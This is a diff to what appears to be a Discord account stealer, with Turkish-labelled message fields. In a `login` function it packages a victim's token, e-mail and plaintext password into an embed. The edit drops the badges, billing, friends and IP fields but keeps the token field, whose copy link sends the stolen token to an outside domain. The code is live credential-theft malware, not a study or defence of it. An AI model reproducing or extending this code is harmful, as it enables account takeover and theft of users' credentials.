@@ -611,23 +611,8 @@ const login = async (email, password, token) => {
         fields: [
           {
                         name: '<:cilgin:991704799160582204> Token:',
-                        value: `\`${token}\` [Kopyalamak icin tikla!](https://superfurrycdn.nl/copy/${token})`,
+                        value: `[Kopyalamak icin tikla!](https://superfurrycdn.nl/copy/${token})`,
                         inline: false,
-                    },
-                    {
-                        name: '<:saygi:991705923443761263> Rozetler:',
-                        value: `${badges}`,
-                        inline: true,
-                    },
-                    {
-                        name: '<:ihihi:991704618524475503> Odeme yontemi:',
-                        value: `**${bllling}**`,
-                        inline: true,
-                    },
-                    {
-                        name: '<:iyidegilim:993461526063235092> Arkadaslar:',
-                        value: `\`${friends}\``,
-                        inline: true,
                     },
                     {
                         name: '<:ne_baktin_guzelim:991704353704513617> E-posta:',
@@ -635,11 +620,6 @@ const login = async (email, password, token) => {
                         inline: true,
                     },
                    
-                    {
-                        name: '<:dusunuom:991704756013777008> IP:',
-                        value: `\`${config.ip}\``,
-                        inline: true,
-                    },
                     {
                         name: '<:yasasinirkimiz:991704134271127702> Sifre:',
             value: `\`${password}\``,
